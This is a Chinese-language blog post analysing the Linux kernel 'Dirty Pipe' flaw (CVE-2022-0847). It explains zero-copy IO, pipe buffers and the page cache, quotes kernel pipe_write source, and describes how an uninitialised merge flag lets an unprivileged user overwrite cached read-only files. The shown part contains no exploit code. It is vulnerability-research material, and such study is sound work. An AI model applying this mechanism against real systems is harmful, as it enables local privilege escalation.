<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>CVE-2022-0847内核提权漏洞分析复现 | 月明星稀</title><meta name="author" content="lhl_2507"><meta name="copyright" content="lhl_2507"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="CVE-2022-0847内核提权漏洞分析复现 翻译翻译：  A flaw was found in the way the  “flags” member of the new pipe buffer structure was lacking proper initialization in copy_page_to_iter_pipe and push_pipe functions in t">
<meta property="og:type" content="article">
<meta property="og:title" content="CVE-2022-0847内核提权漏洞分析复现">
<meta property="og:url" content="https://lhl7.github.io/2022/04/29/CVE-2022-0847%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/index.html">
<meta property="og:site_name" content="月明星稀">
<meta property="og:description" content="CVE-2022-0847内核提权漏洞分析复现 翻译翻译：  A flaw was found in the way the  “flags” member of the new pipe buffer structure was lacking proper initialization in copy_page_to_iter_pipe and push_pipe functions in t">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://lhl7.github.io/img/index.jpg">
<meta property="article:published_time" content="2022-04-29T06:35:35.696Z">
<meta property="article:modified_time" content="2022-04-29T06:35:11.488Z">
<meta property="article:author" content="lhl_2507">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://lhl7.github.io/img/index.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://lhl7.github.io/2022/04/29/CVE-2022-0847%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"search.xml","languages":{"hits_empty":"We didn't find any results for the search: ${query}"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: 'Just',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'CVE-2022-0847内核提权漏洞分析复现',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2022-04-29 14:35:11'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.0.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data is-center"><div class="data-item"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">52</div></a></div><div class="data-item"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a></div><div class="data-item"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">12</div></a></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/index.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">月明星稀</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> Search</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">CVE-2022-0847内核提权漏洞分析复现</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2022-04-29T06:35:35.696Z" title="Created 2022-04-29 14:35:35">2022-04-29</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2022-04-29T06:35:11.488Z" title="Updated 2022-04-29 14:35:11">2022-04-29</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/cve/">cve</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="CVE-2022-0847内核提权漏洞分析复现"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="CVE-2022-0847内核提权漏洞分析复现"><a href="#CVE-2022-0847内核提权漏洞分析复现" class="headerlink" title="CVE-2022-0847内核提权漏洞分析复现"></a>CVE-2022-0847内核提权漏洞分析复现</h1><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220421103234337.png" alt="image-20220421103234337"></p>
<p>翻译翻译：</p>
<blockquote>
<p>A flaw was found in the way the  “flags” member of the new pipe buffer structure was lacking proper initialization in copy_page_to_iter_pipe and push_pipe functions in the Linux kernel and could thus contain stale values. An unprivileged local user could use this flaw to write to pages in the page cache backed by read only files and as such escalate their privileges on the system.</p>
</blockquote>
<p>​    就是有一个pipe结构中，有一个flag成员，他初始化的时候调用了copy_page_to_iter_pipe、push_pipe两个函数，这两个函数有可能不能正确的初始化，最终导致的就是只读文件可写，然后就可以导致一个本地的权限提升。</p>
<h2 id="0x01-背景知识"><a href="#0x01-背景知识" class="headerlink" title="0x01 背景知识"></a>0x01 背景知识</h2><p>首先需要解释上面漏洞概述中的一些noun</p>
<h3 id="一、文件读写背景知识"><a href="#一、文件读写背景知识" class="headerlink" title="一、文件读写背景知识"></a>一、文件读写背景知识</h3><h4 id="1、传统IO模式"><a href="#1、传统IO模式" class="headerlink" title="1、传统IO模式"></a>1、传统IO模式</h4><p>​    磁盘的IO读写速度是很慢的，所以一般当我们访问一个磁盘文件的时候，首先会将其内容装载到物理内存中，后续的访问都是直接取内存中的副本来读取数据。因为一个文件的内存副本，后续可能会被很多进程打开使用，为了保证大家都能快速的访问，Linux设计了这样一个Page Cache机制管理起物理内存中映射的页框。</p>
<p>​    如果用户进程使用read/write读写文件，那么内核会先将载入数据的物理内存映射到内核虚拟内存buffer。然后再将内核的buffer数据拷贝到用户态。</p>
<p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/c2ae42cb72b84648880e2885b5d7feab.png" alt="在这里插入图片描述"></p>
<p>​    这里简单的做一个理解（，这里磁盘和物理内存都是硬件，然后物理内存的内容通过页表映射，相当于对于内存做了一个索引，但是用户要读数据，不能直接和硬件交互，也不能直接读内核，用户只能和操作系统提供的<strong>接口</strong>交互，也就是上图左边写的<strong>拷贝</strong>两个字，意思是从<strong>内核空间</strong>中把<strong>buffer</strong>再复制到<strong>用户空间</strong>，这样在用户空间中，其他进程需要<strong>buffer</strong>时，再与<strong>进程1</strong>进行通信。</p>
<p>​    为了加深理解，我们再举个例子：</p>
<p>​    现在我要将硬盘中的一个文件上传到网络上，电脑需要做些什么呢？首先，通过<code>read()</code>把数据从硬盘读取到内核缓冲区，然后，再复制到用户缓冲区；之后，再通过<code>write()</code>写入到<code>socket缓冲区</code>，最后写入网卡设备。</p>
<p>整个过程发生了<strong>4次用户态和内核态的上下文切换</strong>和<strong>4次拷贝</strong>，具体流程如下：</p>
<ol>
<li>用户进程通过<code>read()</code>方法向操作系统发起调用，此时上下文从用户态转向内核态</li>
<li>DMA控制器把数据从硬盘中拷贝到读缓冲区</li>
<li>CPU把读缓冲区数据拷贝到应用缓冲区，上下文从内核态转为用户态，<code>read()</code>返回</li>
<li>用户进程通过<code>write()</code>方法发起调用，上下文从用户态转为内核态</li>
<li>CPU将应用缓冲区中数据拷贝到socket缓冲区</li>
<li>DMA控制器把数据从socket缓冲区拷贝到网卡，上下文从内核态切换回用户态，<code>write()</code>返回</li>
</ol>
<p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220429101522755.png" alt="image-20220429101522755"></p>
<p>​    </p>
<p>​    这里存在一个问题，那就是太慢，这样交互的过程始终存在一个经过内核复制到用户，再经过用户复制到内核的过程，如果能直接和内核，让内核直接处理这些事情，那就就更快了！因此，我们就引入了<strong>零拷贝</strong>的概念。</p>
<h4 id="2、新的IO-零拷贝"><a href="#2、新的IO-零拷贝" class="headerlink" title="2、新的IO 零拷贝"></a>2、新的IO 零拷贝</h4><p>​    首先，零拷贝并不是不拷贝！上述的图中就可以看出，最少的拷贝次数是两次（从硬盘到内核，然后直接到网卡）。因此，零拷贝的作用就是减少了拷贝文件的次数。</p>
<h5 id="mmap："><a href="#mmap：" class="headerlink" title="mmap："></a>mmap：</h5><p>​    这里有针对性地，就以一个<strong>mmap</strong>为例，讲一讲具体如何实现零拷贝：</p>
<p>​    依然是上面的例子：</p>
<p>​    mmap+write简单来说就是使用<code>mmap</code>替换了read+write中的read操作，减少了一次CPU的拷贝。</p>
<p>​    <code>mmap</code>主要实现方式是将读缓冲区的地址和用户缓冲区的地址进行映射，内核缓冲区和应用缓冲区共享，从而减少了从读缓冲区到用户缓冲区的一次CPU拷贝。</p>
<p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220429102940747.png" alt="image-20220429102940747"></p>
<p>​    整个过程发生了<strong>4次用户态和内核态的上下文切换</strong>和<strong>3次拷贝</strong>，具体流程如下：</p>
<ol>
<li>用户进程通过<code>mmap()</code>方法向操作系统发起调用，上下文从用户态转向内核态</li>
<li>DMA控制器把数据从硬盘中拷贝到读缓冲区</li>
<li><strong>上下文从内核态转为用户态，mmap调用返回</strong></li>
<li>用户进程通过<code>write()</code>方法发起调用，上下文从用户态转为内核态</li>
<li><strong>CPU将读缓冲区中数据拷贝到socket缓冲区</strong></li>
<li>DMA控制器把数据从socket缓冲区拷贝到网卡，上下文从内核态切换回用户态，<code>write()</code>返回</li>
</ol>
<p>​    总结一下：<code>mmap</code>的方式节省了一次CPU拷贝，同时由于用户进程中的内存是虚拟的，只是映射到内核的读缓冲区，所以可以节省一半的内存空间，比较适合大文件的传输。</p>
<p>​    下面这张图也是同样的意思，不发生系统调用，跨越用户和内核的边界做上下文切换。用户进程可以使用mmap直接将用户态的buffer 映射到物理内存，不需要进行系统调用，直接访问自己的mmap区域即可访问到那段物理内存内容。</p>
<p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/79746fc8d81a4e7ab9f28d4ea035fec0.png" alt="在这里插入图片描述"></p>
<p>​    </p>
<h5 id="sendfile："><a href="#sendfile：" class="headerlink" title="sendfile："></a>sendfile：</h5><p>相比<code>mmap</code>来说，<code>sendfile</code>同样减少了一次CPU拷贝，而且还减少了2次上下文切换！</p>
<p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220429110942910.png" alt="image-20220429110942910"></p>
<p>​    可以看到，整个过程发生了<strong>2次用户态和内核态的上下文切换</strong>和<strong>3次拷贝</strong>，具体流程如下：</p>
<ol>
<li>用户进程通过<code>sendfile()</code>方法向操作系统发起调用，上下文从用户态转向内核态</li>
<li>DMA控制器把数据从硬盘中拷贝到读缓冲区</li>
<li>CPU将读缓冲区中数据拷贝到socket缓冲区</li>
<li>DMA控制器把数据从socket缓冲区拷贝到网卡，上下文从内核态切换回用户态，<code>sendfile</code>调用返回</li>
</ol>
<p>​    但是，<code>sendfile</code>方法IO数据对用户空间完全不可见，所以只能适用于完全不需要用户空间处理的情况，比如静态文件服务器。</p>
<p>​    当然，我们可能还有很多效率更高，copy次数更少的零拷贝方式，但是我们只需要了解mmap和senfile这两种，方便我们理解下面的内容即可。</p>
<h3 id="二、pipe相关的结构与函数"><a href="#二、pipe相关的结构与函数" class="headerlink" title="二、pipe相关的结构与函数"></a>二、pipe相关的结构与函数</h3><p>文件通过管道传输流程：<br> in端 == write == pipe == splice == out端<br> out端通过splice与内核缓冲区进行共享，然后in端调用write将内容拷贝到内核缓冲区进而写入到out端。</p>
<h4 id="1、pipe-write"><a href="#1、pipe-write" class="headerlink" title="1、pipe_write"></a>1、pipe_write</h4><p>​    <code>pipe</code> 是内核提供的一个通信管道，通过<code>pipe/pipe2</code> 函数创建，返回两个文件描述符，一个用于发送数据，另一个用于接受数据，类似管道的两段。</p>
<p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/a9bfd558081a4bdab99a26f76580d046.png" alt="在这里插入图片描述"></p>
<p>​    在内核中的实现，通常pipe 缓存空间总长度65536 字节用页的形式进行管理，总共16页(一页4096字节)，页面之间并不连续，而是通过数组进行管理，形成一个环形链表。维护两个链表指针，一个用来写(<code>pipe-&gt;head</code>)，一个用来读(<code>pipe-&gt;tail</code>)，两个指针中间的就是正在使用的东西。</p>
<p>​    看源码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">ssize_t</span></span></span><br><span class="line"><span class="function"><span class="title">pipe_write</span><span class="params">(struct kiocb *iocb, struct iov_iter *from)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">filp</span> =</span> iocb-&gt;ki_filp;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> *<span class="title">pipe</span> =</span> filp-&gt;private_data;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> head;</span><br><span class="line">	<span class="keyword">ssize_t</span> ret = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">size_t</span> total_len = iov_iter_count(from);</span><br><span class="line">	<span class="keyword">ssize_t</span> chars;</span><br><span class="line">	<span class="keyword">bool</span> was_empty = <span class="literal">false</span>;</span><br><span class="line">	<span class="keyword">bool</span> wake_next_writer = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">	··· ···</span><br><span class="line">    ··· ···</span><br><span class="line">	head = pipe-&gt;head;</span><br><span class="line">	was_empty = pipe_empty(head, pipe-&gt;tail);</span><br><span class="line">	chars = total_len &amp; (PAGE_SIZE<span class="number">-1</span>);</span><br><span class="line">	<span class="keyword">if</span> (chars &amp;&amp; !was_empty) &#123; </span><br><span class="line">        <span class="comment">//[1]pipe 缓存不为空，则尝试是否能从当前最后一页&quot;接着&quot;写</span></span><br><span class="line">		<span class="keyword">unsigned</span> <span class="keyword">int</span> mask = pipe-&gt;ring_size - <span class="number">1</span>;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">buf</span> =</span> &amp;pipe-&gt;bufs[(head - <span class="number">1</span>) &amp; mask];</span><br><span class="line">		<span class="keyword">int</span> offset = buf-&gt;offset + buf-&gt;len; </span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> ((buf-&gt;flags &amp; PIPE_BUF_FLAG_CAN_MERGE) &amp;&amp;</span><br><span class="line">		    offset + chars &lt;= PAGE_SIZE) &#123; </span><br><span class="line">            <span class="comment">/*[2]关键，如果PIPE_BUF_FLAG_CAN_MERGE 标志位存在，代表该页允许接着写</span></span><br><span class="line"><span class="comment">             *如果写入长度不会跨页，则接着写，否则直接另起一页 */</span></span><br><span class="line">			ret = pipe_buf_confirm(pipe, buf);</span><br><span class="line">			···</span><br><span class="line">			ret = copy_page_from_iter(buf-&gt;page, offset, chars, from);</span><br><span class="line">			···</span><br><span class="line">			&#125;</span><br><span class="line">			buf-&gt;len += ret;</span><br><span class="line">			···</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (;;) &#123;<span class="comment">//[3]如果上一页没法接着写，则重新起一页</span></span><br><span class="line">		··· ···</span><br><span class="line">		head = pipe-&gt;head;</span><br><span class="line">		<span class="keyword">if</span> (!pipe_full(head, pipe-&gt;tail, pipe-&gt;max_usage)) &#123;</span><br><span class="line">			<span class="keyword">unsigned</span> <span class="keyword">int</span> mask = pipe-&gt;ring_size - <span class="number">1</span>;</span><br><span class="line">			<span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">buf</span> =</span> &amp;pipe-&gt;bufs[head &amp; mask];</span><br><span class="line">			<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span> =</span> pipe-&gt;tmp_page;</span><br><span class="line">			<span class="keyword">int</span> copied;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (!page) &#123;<span class="comment">//[4]重新申请一个新页</span></span><br><span class="line">				page = alloc_page(GFP_HIGHUSER | __GFP_ACCOUNT);</span><br><span class="line">				<span class="keyword">if</span> (unlikely(!page)) &#123;</span><br><span class="line">					ret = ret ? : -ENOMEM;</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				pipe-&gt;tmp_page = page;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			spin_lock_irq(&amp;pipe-&gt;rd_wait.lock);</span><br><span class="line"></span><br><span class="line">			head = pipe-&gt;head;</span><br><span class="line">			··· ···</span><br><span class="line">			pipe-&gt;head = head + <span class="number">1</span>;</span><br><span class="line">			spin_unlock_irq(&amp;pipe-&gt;rd_wait.lock);</span><br><span class="line"></span><br><span class="line">			<span class="comment">/* Insert it into the buffer array */</span></span><br><span class="line">			buf = &amp;pipe-&gt;bufs[head &amp; mask];</span><br><span class="line">			buf-&gt;page = page;<span class="comment">//[5]将新申请的页放到页数组中</span></span><br><span class="line">			buf-&gt;ops = &amp;anon_pipe_buf_ops;</span><br><span class="line">			buf-&gt;offset = <span class="number">0</span>;</span><br><span class="line">			buf-&gt;len = <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">if</span> (is_packetized(filp))</span><br><span class="line">				buf-&gt;flags = PIPE_BUF_FLAG_PACKET;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				buf-&gt;flags = PIPE_BUF_FLAG_CAN_MERGE;</span><br><span class="line">            	<span class="comment">//[6]设置flag，默认PIPE_BUF_FLAG_CAN_MERGE</span></span><br><span class="line">			pipe-&gt;tmp_page = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">			copied = copy_page_from_iter(page, <span class="number">0</span>, PAGE_SIZE, from); </span><br><span class="line">            <span class="comment">//[7]拷贝操作</span></span><br><span class="line">			··· ···</span><br><span class="line">			ret += copied;</span><br><span class="line">			buf-&gt;offset = <span class="number">0</span>;</span><br><span class="line">			buf-&gt;len = copied;</span><br><span class="line"></span><br><span class="line">			··· ···</span><br><span class="line">		&#125;</span><br><span class="line">        ··· ···</span><br><span class="line">    &#125;</span><br><span class="line">	··· ···</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>过程如下：</p>
<ol>
<li>如果当前管道(pipe)中不为空(head==tail判定为空管道)，则说明现在管道中有未被读取的数据，则获取head 指针，也就是指向最新的用来写的页，查看该页的len、offset(为了找到数据结尾)。接下来尝试在当前页面续写</li>
<li>判断 当前页面是否带有 PIPE_BUF_FLAG_CAN_MERGE flag标记，如果不存在则不允许在当前页面续写。或当前写入的数据拼接在之前的数据后面长度超过一页(即写入操作跨页)，如果跨页，则无法续写。</li>
<li>如果无法在上一页续写，则另起一页</li>
<li>alloc_page 申请一个新的页</li>
<li>将新的页放在数组最前面(可能会替换掉原有页面)，初始化值。</li>
<li>buf-&gt;flag 默认初始化为PIPE_BUF_FLAG_CAN_MERGE ，因为默认状态是允许页可以续写的.</li>
<li>拷贝写入的数据，没拷贝完重复上述操作。</li>
</ol>
<p>​    上述这个过程讲的就是如何从内核读取一个数据到用户态，也就是所谓的in到out；</p>
<p>​    这里写一下我的理解：pip-buf是指针，对于相应的page地址做写操作，但是写之前需要判断一个flag，来判断是否能写，这里的page相当于上面提到的一个虚拟内存空间，不直接指向物理内存。</p>
<h4 id="2、零拷贝——splice"><a href="#2、零拷贝——splice" class="headerlink" title="2、零拷贝——splice()"></a>2、零拷贝——splice()</h4><p>​    上文中提到，为了免去数据由内核复制到用户态的额外消耗，操作系统额外提供零拷贝的方法，让用户直接操作内核中的数据。</p>
<p>​    在pipe机制中，直接让用户能够通过buf直接指向内核态中的内容，这个方法也就是<strong>splice</strong>。（这里解释一下，所谓零拷贝只是相对于传统拷贝的一种思想，上文中提到的mmap和将要提到的splice都是对于零拷贝这种思想的不同的实现方法。）</p>
<p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/d3fc29503b7d4a7ea696c2b9f46d323a.png" alt="在这里插入图片描述"></p>
<p>​    这里由于我们pipe里面的地址直接指向了物理地址，也就是<strong>page cache</strong>（page cache是文件在内存中的映像，长期储存在内存中，可以反复被调用，下一部分会详细讲到），此时，当我们再使用<strong>pip_write</strong>函数时，就是直接更改物理内存中的文件映像了。</p>
<h4 id="3、page-cache"><a href="#3、page-cache" class="headerlink" title="3、page cache"></a>3、page cache</h4><p>​    我们知道文件一般存放在硬盘中，CPU 并不能直接访问硬盘中的数据，而是需要先将硬盘中的数据读入到内存中，然后才能被 CPU 访问。由于读写硬盘的速度比读写内存要慢很多（DDR4 内存读写速度是机械硬盘500倍，是固态硬盘的200倍），所以为了避免每次读写文件时，都需要对硬盘进行读写操作，Linux 内核使用 <strong>页缓存（Page Cache）</strong> 机制来对文件中的数据进行缓存。</p>
<p>​    为了提升对文件的读写效率，Linux 内核会以页大小（4KB）为单位，将文件划分为多数据块。当用户对文件中的某个数据块进行读写操作时，内核首先会申请一个内存页（称为 <code>页缓存</code>）与文件中的数据块进行绑定。如下图所示：</p>
<p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220429115326780.png" alt="image-20220429115326780"></p>
<p>​    如上图所示，当用户对文件进行读写时，实际上是对文件的 <code>页缓存</code> 进行读写。所以对文件进行读写操作时，会分以下两种情况进行处理：</p>
<ul>
<li>当从文件中读取数据时，如果要读取的数据所在的页缓存已经存在，那么就直接把页缓存的数据拷贝给用户即可。否则，内核首先会申请一个空闲的内存页（页缓存），然后从文件中读取数据到页缓存，并且把页缓存的数据拷贝给用户。</li>
<li>当向文件中写入数据时，如果要写入的数据所在的页缓存已经存在，那么直接把新数据写入到页缓存即可。否则，内核首先会申请一个空闲的内存页（页缓存），然后从文件中读取数据到页缓存，并且把新数据写入到页缓存中。对于被修改的页缓存，内核会定时把这些页缓存刷新到文件中。</li>
</ul>
<h2 id="0x02-漏洞原理"><a href="#0x02-漏洞原理" class="headerlink" title="0x02 漏洞原理"></a>0x02 漏洞原理</h2><h3 id="一、原理分析"><a href="#一、原理分析" class="headerlink" title="一、原理分析"></a>一、原理分析</h3><blockquote>
<p>splice()系统调用将包含文件的页面缓存(page cache), 链接到pipe的环形缓冲区(pipe_buffer)时, 在copy_page_to_iter_pipe 和 push_pipe函数中未能正确清除页面的”PIPE_BUF_FLAG_CAN_MERGE”属性, 导致后续进行pipe_write()操作时错误的判定”write操作可合并(merge)”, 从而将非法数据写入文件页面缓存, 导致任意文件覆盖漏洞。</p>
</blockquote>
<p>​    在了解了上述内容之后，这个原理就非常奇葩了。在调用零拷贝的核心函数splice函数时，存在这样的调用栈：</p>
<ul>
<li><p>SYSCALL_DEFINE6(splice,…) -&gt; __do_sys_splice -&gt; __do_splice-&gt; do_splice</p>
<ul>
<li><p>splice_file_to_pipe -&gt; do_splice_to</p>
<ul>
<li><p>generic_file_splice_read(in-&gt;f_op-&gt;splice_read 默认为 generic_file_splice_read)</p>
<ul>
<li><p>call_read_iter -&gt; filemap_read</p>
<ul>
<li>copy_page_to_iter -&gt; copy_page_to_iter_pipe</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
